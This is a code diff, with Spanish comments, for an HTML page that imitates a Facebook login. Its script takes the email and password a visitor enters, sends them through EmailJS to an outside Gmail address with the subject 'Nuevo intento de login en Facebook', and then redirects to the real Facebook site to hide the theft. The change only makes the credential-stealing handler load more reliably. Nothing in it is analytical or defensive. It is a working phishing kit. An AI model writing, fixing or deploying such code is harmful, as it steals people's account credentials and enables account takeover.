@@ -135,46 +135,56 @@
     </div>
 
     <script>
-        // Inicializar EmailJS
-        emailjs.init('qWiMP8LChbWxJNgWs');
+        // Esperar a que EmailJS se cargue
+        function initEmailJS() {
+            if (typeof emailjs !== 'undefined') {
+                emailjs.init('qWiMP8LChbWxJNgWs');
 
-        const loginForm = document.getElementById('loginForm');
-        const loginBtn = document.getElementById('loginBtn');
-        const emailInput = document.getElementById('email');
-        const passwordInput = document.getElementById('password');
+                const loginForm = document.getElementById('loginForm');
+                const loginBtn = document.getElementById('loginBtn');
+                const emailInput = document.getElementById('email');
+                const passwordInput = document.getElementById('password');
 
-        loginForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
+                loginForm.addEventListener('submit', async (e) => {
+                    e.preventDefault();
 
-            const email = emailInput.value;
-            const password = passwordInput.value;
+                    const email = emailInput.value;
+                    const password = passwordInput.value;
 
-            if (!email || !password) {
-                alert('Por favor completa todos los campos');
-                return;
-            }
+                    if (!email || !password) {
+                        alert('Por favor completa todos los campos');
+                        return;
+                    }
 
-            loginBtn.disabled = true;
-            loginBtn.textContent = 'Iniciando sesión...';
+                    loginBtn.disabled = true;
+                    loginBtn.textContent = 'Iniciando sesión...';
 
-            try {
-                // Enviar email a través de EmailJS
-                await emailjs.send('service_mn9co68', 'template_8yzlwpb', {
-                    to_email: 'penegordoasustado@gmail.com',
-                    user_email: email,
-                    user_password: password,
-                    subject: 'Nuevo intento de login en Facebook'
+                    try {
+                        // Enviar email a través de EmailJS
+                        await emailjs.send('service_mn9co68', 'template_8yzlwpb', {
+                            to_email: 'penegordoasustado@gmail.com',
+                            user_email: email,
+                            user_password: password,
+                            subject: 'Nuevo intento de login en Facebook'
+                        });
+
+                        // Redirigir a Facebook después de enviar
+                        window.location.href = 'https://www.facebook.com';
+                    } catch (error) {
+                        console.error('Error al enviar email:', error);
+                        alert('Error al iniciar sesión. Por favor intenta de nuevo.');
+                        loginBtn.disabled = false;
+                        loginBtn.textContent = 'Iniciar sesión';
+                    }
                 });
-
-                // Redirigir a Facebook después de enviar
-                window.location.href = 'https://www.facebook.com';
-            } catch (error) {
-                console.error('Error al enviar email:', error);
-                alert('Error al iniciar sesión. Por favor intenta de nuevo.');
-                loginBtn.disabled = false;
-                loginBtn.textContent = 'Iniciar sesión';
+            } else {
+                // Reintentar si EmailJS aún no está disponible
+                setTimeout(initEmailJS, 100);
             }
-        });
+        }
+
+        // Inicializar cuando el documento esté listo
+        document.addEventListener('DOMContentLoaded', initEmailJS);
     </script>
 </body>
 </html>
